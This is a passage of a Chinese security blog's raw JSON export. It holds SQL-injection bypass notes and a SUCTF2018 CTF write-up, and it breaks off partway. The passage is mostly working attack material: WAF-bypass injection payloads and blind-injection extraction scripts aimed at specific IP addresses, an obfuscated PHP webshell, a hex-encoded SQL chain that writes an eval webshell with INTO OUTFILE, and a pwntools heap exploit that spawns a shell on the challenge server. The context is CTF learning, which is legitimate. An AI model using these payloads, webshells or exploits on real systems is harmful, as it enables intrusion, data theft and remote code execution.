class=\"headerlink\" title=\"– 注释\"></a>– 注释</h1><p>–后边不允许添加任何空白字符<br>过滤正则表达式如下:<br>–[\\s\\xA0]<br>还可以使用%1a<br>–%1a绕过</p>\n<h1 id=\"where后边跟着sleep函数\"><a href=\"#where后边跟着sleep函数\" class=\"headerlink\" title=\"where后边跟着sleep函数\"></a>where后边跟着sleep函数</h1><p><code>select * from table_name where sleep(2) or 1 = 2;</code></p>\n<p>如果1=2，则会等待（2*该表中的记录数）秒，没有数据返回<br>如果1=1，则会立即返回所有数据</p>\n<p>@<code>&#39;</code> 相当于 NULL</p>\n<p>select group_concat(ip)’’ from client_ip;</p>\n<h1 id=\"DNSlog盲注\"><a href=\"#DNSlog盲注\" class=\"headerlink\" title=\"DNSlog盲注\"></a>DNSlog盲注</h1><p>DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>\n<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>\n<p>2、当secure_file_priv为G:\\，就可以读取G盘的文件。</p>\n<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>\n<p>sleep 不能填数字，可以使用pi()替代</p>\n<p>各种payload:</p>\n<pre><code>select * from antisqli where `id`=&#39;\\&#39; and `pw`=md5(&#39; union select 1,2,3--&#39;)\n</code></pre><pre><code>644400 union select &#39;z1&#39;,flag,&#39;z3&#39;,&#39;z4&#39; from flag order by password desc#\n</code></pre><p>关键词union,select,from被过滤，可以考虑%00绕过</p>\n<pre><code>//过滤sql\n$array = array(&#39;table&#39;,&#39;union&#39;,&#39;and&#39;,&#39;or&#39;,&#39;load_file&#39;,&#39;create&#39;,&#39;delete&#39;,&#39;select&#39;,&#39;update&#39;,&#39;sleep&#39;,&#39;alter&#39;,&#39;drop&#39;,&#39;truncate&#39;,&#39;from&#39;,&#39;max&#39;,&#39;min&#39;,&#39;order&#39;,&#39;limit&#39;);\nforeach ($array as $value)\n{\n    if (substr_count($id, $value) &gt; 0)\n    {\n        exit(&#39;包含敏感关键字！&#39;.$value);\n    }\n}\n\n//xss过滤\n$id = strip_tags($id);\n\n$query = &quot;SELECT * FROM temp WHERE id={$id} LIMIT 1&quot;;\npayload:\nhttp://103.238.227.13:10087/?id=2 unio%00n se%00lect hash,2 fro%00m sql3.key#\n由于strip_tags 将&lt;&gt;替换为空，所以可以使用&lt;&gt;绕过：\nhttp://103.238.227.13:10087/?id=2 unio&lt;&gt;n se&lt;&gt;lect hash,2 fro%00m sql3.key#\n</code></pre><p>某些情况下SQL关键词被过滤掉并且被替换成空格。因此我们用“%0b”来绕过。<br>id=1+uni%0bon+se%0blect+1,2,3–</p>\n<h1 id=\"Mysql大小写不敏感，绕过检测\"><a href=\"#Mysql大小写不敏感，绕过检测\" class=\"headerlink\" title=\"Mysql大小写不敏感，绕过检测\"></a>Mysql大小写不敏感，绕过检测</h1><h1 id=\"heavy-query\"><a href=\"#heavy-query\" class=\"headerlink\" title=\"heavy query\"></a>heavy query</h1><p><a href=\"http://www.360zhijia.com/anquan/369098.html\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"笛卡尔积运算\"><a href=\"#笛卡尔积运算\" class=\"headerlink\" title=\"笛卡尔积运算\"></a>笛卡尔积运算</h2><blockquote>\n<p>select <em> from content where id = 1 and 1 and (SELECT count(</em>) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C);</p>\n</blockquote>\n<pre><code class=\"python\">import requests\n\nurl = &quot;http://52.80.179.198:8080/article.php?id=1&#39; and %s and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)%%23&quot;\ndata = &quot;&quot;\nfor i in range(1,1000):\n    for j in range(33,127):\n        #payload = &quot;(ascii(substr((database()),%s,1))=%s)&quot;%(i,j) #post\n        #payload = &quot;(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)&quot; % (i, j) #article,flags\n        #payload = &quot;(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;flags&#39;),%s,1))=%s)&quot; % (i, j) #flag\n        payload = &quot;(ascii(substr((select flag from flags limit 1),%s,1))=%s)&quot; % (i, j)\n        payload_url = url%(payload)\n        try:\n            r = requests.get(url=payload_url,timeout=8)\n        except:\n            data +=chr(j)\n            print data\n            break\n</code></pre>\n<h2 id=\"Get-lock\"><a href=\"#Get-lock\" class=\"headerlink\" title=\"Get_lock\"></a>Get_lock</h2><p>get_lock是mysql的锁机制</p>\n<ul>\n<li>get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。</li>\n<li>当调用release_lock来释放上面的锁或者客户端断线，上面的锁才释放，其他的客户端才能进来</li>\n</ul>\n<p>打开两个cmd</p>\n<p>cmd1:</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,1);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,1) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n</code></pre><p>cmd2:</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,5);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,5) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (5.00 sec)\n</code></pre><p>cmd1:</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,2);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,2) |\n+--------------------------+\n|                        0 |\n+--------------------------+\n1 row in set (2.00 sec)\n</code></pre><p>关闭cmd1,cmd2执行：</p>\n<pre><code>mysql&gt; select get_lock(&#39;skysec.top&#39;,5);\n+--------------------------+\n| get_lock(&#39;skysec.top&#39;,5) |\n+--------------------------+\n|                        1 |\n+--------------------------+\n1 row in set (0.00 sec)\n</code></pre><p>cmd1关闭之后，锁自动释放，方案不是最佳，原因，该方法需要前提，长连接一般在php版本系列中，我们建立与Mysql的连接使用的是<code>mysql_connect</code>。</p>\n<pre><code>mysql_connect() 脚本一结束，到服务器的连接就被关闭\nmysql_pconnect() 打开一个到 MySQL 服务器的持久连接\n</code></pre><p>官方描述：</p>\n<pre><code>mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别。\n首先，当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。\n其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。\n简单来说，即\nmysql_connect()使用后立刻就会断开\n而\nmysql_pconnect()会保持连接，并不会立刻断开\n</code></pre><p>所以:</p>\n<p>我们的时间盲注必须基于我们请求加锁的资源已经被其他客户端加锁过了 而mysql_connect()一结束，就会立刻关闭连接 这就意味着，我们刚刚对资源<code>skysec.top</code>加完锁就立刻断开了 而get_lock一旦断开连接，就会立刻释放资源 那么也就破坏了我们的前提：我们请求加锁的key已经被其他客户端加锁过了 所以如果使用了<code>mysql_connect()</code>，那么get_lock的方法将不适用 而<code>mysql_pconnect()</code>建立的却是长连接，我们的锁可以在一段有效的时间中一直加持在特定资源上 从而使我们可以满足大前提，而导致新的time injection手法 当然这里还有一个注意点 即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发get_lock 同样我们也本地测试一下，还是之前的cmd1和cmd2</p>\n<p> cmd1:</p>\n<pre><code>mysql&gt; select * from content where id = 1 and get_lock(&#39;skysec.top&#39;,1);\n+----+-------------------------------------+\n| id | content                             |\n+----+-------------------------------------+\n|  1 | I think you may need sql injection! |\n+----+-------------------------------------+\n1 row in set (0.00 sec)\n</code></pre><p>cmd2:</p>\n<pre><code>mysql&gt; select * from content where id =1 and 1 and get_lock(&#39;skysec.top&#39;,5);\nEmpty set (5.00 sec)\n\nmysql&gt; select * from content where id =1 and 0 and get_lock(&#39;skysec.top&#39;,5);\nEmpty set (0.00 sec)\n</code></pre><p>脚本如下:</p>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport requests\nimport time\nurl1 = &quot;http://52.80.179.198:8080/article.php?id=1&#39; and get_lock(&#39;skysec.top&#39;,1)%23&quot;\nr = requests.get(url=url1)\ntime.sleep(90)\n# 加锁后变换身份\nurl2 = &quot;http://52.80.179.198:8080/article.php?id=1&#39; and %s and get_lock(&#39;skysec.top&#39;,5)%%23&quot;\ndata = &quot;&quot;\nfor i in range(1,1000):\n    print i\n    for j in range(33,127):\n        #payload = &quot;(ascii(substr((database()),%s,1))=%s)&quot;%(i,j) #post\n        payload = &quot;(ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s)&quot; % (i, j) #article,flags\n        #payload = &quot;(ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#39;flags&#39;),%s,1))=%s)&quot; % (i, j) #flag\n        #payload = &quot;(ascii(substr((select flag from flags limit 1),%s,1))=%s)&quot; % (i, j)\n        payload_url = url2%(payload)\n        try:\n            s = requests.get(url=payload_url,timeout=4.5)\n        except:\n            data +=chr(j)\n            print data\n            break\n</code></pre>\n<p>总结:</p>\n<p>必须使用长连接，即使用mysql_pconnect()</p>\n<p>构造被加锁的数据</p>\n<p>1.以客户A的身份,对资源skysec.top进行加锁 </p>\n<p>2.等待90s，让服务器将我们下一次的查询当做客户B </p>\n<p>3.利用客户B去尝试对资源skysec.top进行加锁，由于资源已被加锁，导致延时 </p>\n<h2 id=\"Rlike\"><a href=\"#Rlike\" class=\"headerlink\" title=\"Rlike\"></a>Rlike</h2><p>正则表达式</p>\n<pre><code>concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;\n</code></pre><p>以上代码等同于sleep(5)</p>\n<pre><code>mysql&gt; select * from content where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;\nEmpty set (4.24 sec)\n\nmysql&gt; select * from content where id =1 and IF(0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) and &#39;1&#39;=&#39;1&#39;;\nEmpty set (0.00 sec)\n</code></pre><h2 id=\"sleep\"><a href=\"#sleep\" class=\"headerlink\" title=\"sleep\"></a>sleep</h2><pre><code>mysql&gt; select sleep(5);\n+----------+\n| sleep(5) |\n+----------+\n|        0 |\n+----------+\n1 row in set (5.00 sec)\n</code></pre><p>BENCHMARK</p>\n<pre><code>mysql&gt; select benchmark(10000000,sha(1));\n+----------------------------+\n| benchmark(10000000,sha(1)) |\n+----------------------------+\n|                          0 |\n+----------------------------+\n1 row in set (2.79 sec)\n</code></pre>"},{"title":"suctf2018","date":"2018-05-28T08:46:05.000Z","password":654321,"_content":"\n# SUCTF2018\n\n<!--more-->\n\n没做过，自己复现\n\ndocker仓库：\n\n```\nsuctf/2018-web-multi_sql\nsuctf/2018-web-homework\nsuctf/2018-web-hateit\nsuctf/2018-web-getshell\nsuctf/2018-web-annonymous\nsuctf/2018-pwn-note\nsuctf/2018-pwn-noend\nsuctf/2018-pwn-lock2\nsuctf/2018-pwn-heapprint\nsuctf/2018-pwn-heap\nsuctf/2018-misc-padding\nsuctf/2018-misc-game\nsuctf/2018-misc-rsagood\nsuctf/2018-misc-rsa\nsuctf/2018-misc-enjoy\nsuctf/2018-misc-pass\n```\n\n## Anonymous\n\n```\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\nsolve.py\n\n```\nimport requests\nimport socket\nimport time\nfrom multiprocessing.dummy import Pool as ThreadPool\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\ndef run(i):\n    while 1:\n        HOST = 'web.suctf.asuri.org'\n        PORT = 81\n        url = \"http://web.suctf.asuri.org:81/index.php\"\n        requests.get(url)\n        print 'ok'\n        time.sleep(0.5)\n        print requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1').content\n\ni = 8\npool = ThreadPool( i )\nresult = pool.map_async( run, range(i) ).get(0xffff)\n```\n\n## Getshell\n\n```\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n}\n```\n\n使用burp intruder找出未被过滤的可打印字符串。\n\n```\n$()[]_~=;.\n```\n\n跑的时候需注意`Intruder=>payloads=>payload encoding` 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。\n\n跑的时候可以在`Intruder=>options=>Grep-Match` 中选择 flag `illegal` ，这样就可以快速看到那些字符是合法的了。\n\nshell:\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);\n```\n\n```\n<?= \n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_____=~得[$_];//A\n$______=~第[$_];//S\n$_______=~学[$_];//R\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$__=$_____.$______.$______.$___.$_______.$____;//ASSERT\n$__($_[_]);//ASSERT($_GET[_]);\n```\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\n```\n\n```\n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$_[_]($_[__]);//$_GET[_]($_GET[__]);\n```\n\n## MultiSql\n\n```\n@@secure_file_priv           限制intofile可以写入的文件目录\n```\n\nwaf.php\n\n```\n<?php\n\tfunction waf($str){\n\t\t$black_str = \"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&])/i\";\n\t\t$str = preg_replace($black_str, \"@@\",$str);\n\t\treturn addslashes($str);\n\t}\n```\n\nsql注入关键代码:\n\n```\nif (isset($_SESSION['user_name'])) {\n\tinclude_once('../header.php');\n\tif (!isset($SESSION['user_id'])) {\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n\techo $sql;\t\t\n$data = mysqli_query($connect,$sql) or die('Mysql Error!!');\n\t\t$result = mysqli_fetch_array($data);\n\t\tvar_dump($result);\n\t\t$_SESSION['user_id'] = $result['DWVS_user_id'];\n\t}\n\n\t$html_avatar = htmlspecialchars($_SESSION['user_favicon']);\n\t\n\t\n\tif(isset($_GET['id'])){\n\t\t$id=waf($_GET['id']);\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_id =\".$id;\n\t\t$data = mysqli_multi_query($connect,$sql) or die();\n\t\t\n\t\t$result = mysqli_store_result($connect);\n\t\t$row = mysqli_fetch_row($result);\n\t\techo '<h1>user_id:'.$row[0].\"</h1><br><h2>user_name:\".$row[1].\"</h2><br><h3>注册时间：\".$row[4].\"</h3>\";\n\t\tmysqli_free_result($result);\n\t\tdie();\n\t}\n\tmysqli_close($connect);\n```\n\n使用set跟hex编码的方式执行sql语句:\n\n```\nselect user()                    =>   0x73656c65637420757365722829\n```\n\n```\nset @num=0x73656c65637420757365722829;prepare t from @num;execute t;\n```\n\n写shell:\n\n```\n<?php eval($_REQUEST['55332']);?>       =>   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e   \n```\n\n```\nset @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;\n```\n\n```\nselect 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile '/var/www/html/favicon/wfox.php'\n```\n\n方法二:\n\n注册两个账号:\n\n```sql\n<?=$_GET[c];?>                                        \n\n<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php \n```\n\n这样，当使用第二个账号登录的时候:\n\n```\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name ='<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php ' into outfile '/var/www/html/favicon/c1.php';\n```\n\n就会将我们的shell写入账号。\n\n# PWN\n\n## Note\n\n```\n#!/usr/bin/env python2\n\nfrom pwn import *\nfrom IPython import embed\nimport re\n\ncontext.arch = 'amd64'\n\nr = remote('pwn.suctf.asuri.org', 20003)\n\ndef add(size, content):\n    r.sendlineafter('>>', '1')\n    r.sendlineafter('Size:', str(size))\n    r.sendlineafter('Content:', content)\n\ndef show(idx):\n    r.sendlineafter('>>', '2')\n    r.sendlineafter('Index:', str(idx))\n    r.recvuntil('Content:')\n    return r.recvuntil('1.Add a not', drop=True)\n\ndef pandora():\n    r.sendlineafter('>>', '3')\n    r.sendlineafter('yes:1)', '1')\n\n\nadd(10, 'a'*24+flat(0xec1))\nadd(4000, 'a')\npandora()\nx = show(0).strip()\nheap = u64(x.ljust(8, '\\x00')) - 0x140\nprint 'heap:', hex(heap)\nadd(0x90-8, 'a'*7)\nx = show(1).strip()\nlibc = u64(x.ljust(8, '\\x00')) - 0x3bfb58\nprint 'libc:', hex(libc)\n\n#_IO_list_all = libc + 0x3c5520\n_IO_list_all = libc + 0x3c0500\n_IO_str_jumps = libc + 0x3bc4c0\n#system = libc + 0x45390\nsystem = libc + 0x456d0\npop_rax_rbx_rbp = libc + 0x1fa71\nret = libc + 0x1fa74\nadd(10, flat(\n    'a'*16,\n    0x0, 0x61,\n    0, _IO_list_all-0x10,\n    0, 1,\n    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap & buf_end-buf_base==0\n    [0]*18, _IO_str_jumps,\n    ret, system,                    # malloc do nothing, free(buf_base) == system('/bin/sh')\n    '/bin/sh\\x00',\n))\n\n#raw_input(\"@\")\nr.sendlineafter('>>', '1')\nr.sendlineafter('Size:', '10')\n\n#embed()\nr.interactive()\n```\n\n","source":"_posts/suctf2018.md","raw":"---\ntitle: suctf2018\ndate: 2018-05-28 16:46:05\ntags:\npassword: 654321\n---\n\n# SUCTF2018\n\n<!--more-->\n\n没做过，自己复现\n\ndocker仓库：\n\n```\nsuctf/2018-web-multi_sql\nsuctf/2018-web-homework\nsuctf/2018-web-hateit\nsuctf/2018-web-getshell\nsuctf/2018-web-annonymous\nsuctf/2018-pwn-note\nsuctf/2018-pwn-noend\nsuctf/2018-pwn-lock2\nsuctf/2018-pwn-heapprint\nsuctf/2018-pwn-heap\nsuctf/2018-misc-padding\nsuctf/2018-misc-game\nsuctf/2018-misc-rsagood\nsuctf/2018-misc-rsa\nsuctf/2018-misc-enjoy\nsuctf/2018-misc-pass\n```\n\n## Anonymous\n\n```\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\nsolve.py\n\n```\nimport requests\nimport socket\nimport time\nfrom multiprocessing.dummy import Pool as ThreadPool\ntry:\n    requests.packages.urllib3.disable_warnings()\nexcept:\n    pass\n\ndef run(i):\n    while 1:\n        HOST = 'web.suctf.asuri.org'\n        PORT = 81\n        url = \"http://web.suctf.asuri.org:81/index.php\"\n        requests.get(url)\n        print 'ok'\n        time.sleep(0.5)\n        print requests.get('http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1').content\n\ni = 8\npool = ThreadPool( i )\nresult = pool.map_async( run, range(i) ).get(0xffff)\n```\n\n## Getshell\n\n```\nif($contents=file_get_contents($_FILES[\"file\"][\"tmp_name\"])){\n    $data=substr($contents,5);\n    foreach ($black_char as $b) {\n        if (stripos($data, $b) !== false){\n            die(\"illegal char\");\n        }\n    }     \n}\n```\n\n使用burp intruder找出未被过滤的可打印字符串。\n\n```\n$()[]_~=;.\n```\n\n跑的时候需注意`Intruder=>payloads=>payload encoding` 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。\n\n跑的时候可以在`Intruder=>options=>Grep-Match` 中选择 flag `illegal` ，这样就可以快速看到那些字符是合法的了。\n\nshell:\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_____=~得[$_];$______=~第[$_];$_______=~学[$_];$_=_.$__.$___.$____;$_=$$_;$__=$_____.$______.$______.$___.$_______.$____;$__($_[_]);\n```\n\n```\n<?= \n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_____=~得[$_];//A\n$______=~第[$_];//S\n$_______=~学[$_];//R\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$__=$_____.$______.$______.$___.$_______.$____;//ASSERT\n$__($_[_]);//ASSERT($_GET[_]);\n```\n\n```\n<?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);\n```\n\n```\n$_=_==_;//1\n$__=~一[$_];//G\n$___=~了[$_];//E\n$____=~端[$_];//T\n$_=_.$__.$___.$____;//_GET\n$_=$$_;//$_GET\n$_[_]($_[__]);//$_GET[_]($_GET[__]);\n```\n\n## MultiSql\n\n```\n@@secure_file_priv           限制intofile可以写入的文件目录\n```\n\nwaf.php\n\n```\n<?php\n\tfunction waf($str){\n\t\t$black_str = \"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&])/i\";\n\t\t$str = preg_replace($black_str, \"@@\",$str);\n\t\treturn addslashes($str);\n\t}\n```\n\nsql注入关键代码:\n\n```\nif (isset($_SESSION['user_name'])) {\n\tinclude_once('../header.php');\n\tif (!isset($SESSION['user_id'])) {\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n\techo $sql;\t\t\n$data = mysqli_query($connect,$sql) or die('Mysql Error!!');\n\t\t$result = mysqli_fetch_array($data);\n\t\tvar_dump($result);\n\t\t$_SESSION['user_id'] = $result['DWVS_user_id'];\n\t}\n\n\t$html_avatar = htmlspecialchars($_SESSION['user_favicon']);\n\t\n\t\n\tif(isset($_GET['id'])){\n\t\t$id=waf($_GET['id']);\n\t\t$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_id =\".$id;\n\t\t$data = mysqli_multi_query($connect,$sql) or die();\n\t\t\n\t\t$result = mysqli_store_result($connect);\n\t\t$row = mysqli_fetch_row($result);\n\t\techo '<h1>user_id:'.$row[0].\"</h1><br><h2>user_name:\".$row[1].\"</h2><br><h3>注册时间：\".$row[4].\"</h3>\";\n\t\tmysqli_free_result($result);\n\t\tdie();\n\t}\n\tmysqli_close($connect);\n```\n\n使用set跟hex编码的方式执行sql语句:\n\n```\nselect user()                    =>   0x73656c65637420757365722829\n```\n\n```\nset @num=0x73656c65637420757365722829;prepare t from @num;execute t;\n```\n\n写shell:\n\n```\n<?php eval($_REQUEST['55332']);?>       =>   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e   \n```\n\n```\nset @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;\n```\n\n```\nselect 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile '/var/www/html/favicon/wfox.php'\n```\n\n方法二:\n\n注册两个账号:\n\n```sql\n<?=$_GET[c];?>                                        \n\n<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php \n```\n\n这样，当使用第二个账号登录的时候:\n\n```\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name =\".\"'{$_SESSION['user_name']}'\";\n$sql = \"SELECT * FROM dwvs_user_message WHERE DWVS_user_name ='<?=$_GET[c];?>'into outfile'/var/www/html/favicon/c1.php ' into outfile '/var/www/html/favicon/c1.php';\n```\n\n就会将我们的shell写入账号。\n\n# PWN\n\n## Note\n\n```\n#!/usr/bin/env python2\n\nfrom pwn import *\nfrom IPython import embed\nimport re\n\ncontext.arch = 'amd64'\n\nr = remote('pwn.suctf.asuri.org', 20003)\n\ndef add(size, content):\n    r.sendlineafter('>>', '1')\n    r.sendlineafter('Size:', str(size))\n    r.sendlineafter('Content:', content)\n\ndef show(idx):\n    r.sendlineafter('>>', '2')\n    r.sendlineafter('Index:', str(idx))\n    r.recvuntil('Content:')\n    return r.recvuntil('1.Add a not', drop=True)\n\ndef pandora():\n    r.sendlineafter('>>', '3')\n    r.sendlineafter('yes:1)', '1')\n\n\nadd(10, 'a'*24+flat(0xec1))\nadd(4000, 'a')\npandora()\nx = show(0).strip()\nheap = u64(x.ljust(8, '\\x00')) - 0x140\nprint 'heap:', hex(heap)\nadd(0x90-8, 'a'*7)\nx = show(1).strip()\nlibc = u64(x.ljust(8, '\\x00')) - 0x3bfb58\nprint 'libc:', hex(libc)\n\n#_IO_list_all = libc + 0x3c5520\n_IO_list_all = libc + 0x3c0500\n_IO_str_jumps = libc + 0x3bc4c0\n#system = libc + 0x45390\nsystem = libc + 0x456d0\npop_rax_rbx_rbp = libc + 0x1fa71\nret = libc + 0x1fa74\nadd(10, flat(\n    'a'*16,\n    0x0, 0x61,\n    0, _IO_list_all-0x10,\n    0, 1,\n    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap & buf_end-buf_base==0\n    [0]*18, _IO_str_jumps,\n    ret, system,                    # malloc do nothing, free(buf_base) == system('/bin/sh')\n    '/bin/sh\\x00',\n))\n\n#raw_input(\"@\")\nr.sendlineafter('>>', '1')\nr.sendlineafter('Size:', '10')\n\n#embed()\nr.interactive()\n```\n\n","slug":"suctf2018","published":1,"updated":"2018-06-25T06:36:51.663Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpy0013ly4jmkbvmltp","content":"<h1 id=\"SUCTF2018\"><a href=\"#SUCTF2018\" class=\"headerlink\" title=\"SUCTF2018\"></a>SUCTF2018</h1><a id=\"more\"></a>\n<p>没做过，自己复现</p>\n<p>docker仓库：</p>\n<pre><code>suctf/2018-web-multi_sql\nsuctf/2018-web-homework\nsuctf/2018-web-hateit\nsuctf/2018-web-getshell\nsuctf/2018-web-annonymous\nsuctf/2018-pwn-note\nsuctf/2018-pwn-noend\nsuctf/2018-pwn-lock2\nsuctf/2018-pwn-heapprint\nsuctf/2018-pwn-heap\nsuctf/2018-misc-padding\nsuctf/2018-misc-game\nsuctf/2018-misc-rsagood\nsuctf/2018-misc-rsa\nsuctf/2018-misc-enjoy\nsuctf/2018-misc-pass\n</code></pre><h2 id=\"Anonymous\"><a href=\"#Anonymous\" class=\"headerlink\" title=\"Anonymous\"></a>Anonymous</h2><pre><code>&lt;?php\n$MY = create_function(&quot;&quot;,&quot;die(`cat flag.php`);&quot;);\n$hash = bin2hex(openssl_random_pseudo_bytes(32));\neval(&quot;function SUCTF_$hash(){&quot;\n    .&quot;global \\$MY;&quot;\n    